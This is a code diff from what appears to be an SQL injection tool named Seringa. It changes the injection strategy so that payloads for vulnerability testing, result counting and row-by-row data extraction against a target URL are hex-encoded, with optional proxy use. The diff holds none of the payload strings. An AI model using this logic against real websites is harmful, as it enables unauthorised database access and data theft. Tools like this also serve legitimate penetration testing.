@@ -62,7 +62,8 @@ namespace Seringa.Engine.Implementations.InjectionStrategies
 
         public bool TestIfVulnerable()
         {
-            string query = QueryHelper.CreateQuery(Url, ExploitDetails.Exploit, GeneralPayloads.ErrorBasedVictimIdentifier);
+            //string query = QueryHelper.CreateQuery(Url, ExploitDetails.Exploit, GeneralPayloads.ErrorBasedVictimIdentifier);
+            string query = QueryHelper.CreateQuery(Url, ExploitDetails.Exploit, UrlHelpers.HexEncodeValue(GeneralPayloads.ErrorBasedVictimIdentifier));
             
             string pageHtml = QueryRunner.GetPageHtml(query, UseProxy ? ProxyDetails : null);
             var result = HtmlHelpers.GetAnswerFromHtml(pageHtml,query,ExploitDetails,DetailedExceptions);
@@ -92,7 +93,7 @@ namespace Seringa.Engine.Implementations.InjectionStrategies
                 foreach(var param in PayloadDetails.Params)
                     generatedpayload = generatedpayload.Replace("{" + param.Position + "}", PayloadHelpers.GetData(param.Name, this));
 
-            generatedpayload = string.Format(GeneralPayloads.QueryResultCount,generatedpayload);
+            generatedpayload = UrlHelpers.HexEncodeValue(string.Format(GeneralPayloads.QueryResultCount,generatedpayload));
 
             string query = QueryHelper.CreateQuery(Url, ExploitDetails.Exploit, generatedpayload);
             string pageHtml = QueryRunner.GetPageHtml(query, UseProxy ? ProxyDetails : null);
@@ -113,7 +114,8 @@ namespace Seringa.Engine.Implementations.InjectionStrategies
                     generatedPayload = generatedPayload.Replace("{" + param.Position + "}", PayloadHelpers.GetData(param.Name, this));
 
             if (PayloadDetails.ExpectedResultType == Enums.ExpectedResultType.Multiple)
-                generatedPayload = string.Format(PayloadHelpers.GetSingleResultLimiter(PayloadDetails.Dbms), generatedPayload, startingFrom);
+                generatedPayload = UrlHelpers.HexEncodeValue(string.Format(PayloadHelpers.GetSingleResultLimiter(PayloadDetails.Dbms), 
+                                                                generatedPayload, startingFrom));
 
             string query = QueryHelper.CreateQuery(Url, ExploitDetails.Exploit, generatedPayload);
             string pageHtml = QueryRunner.GetPageHtml(query, UseProxy ? ProxyDetails : null);
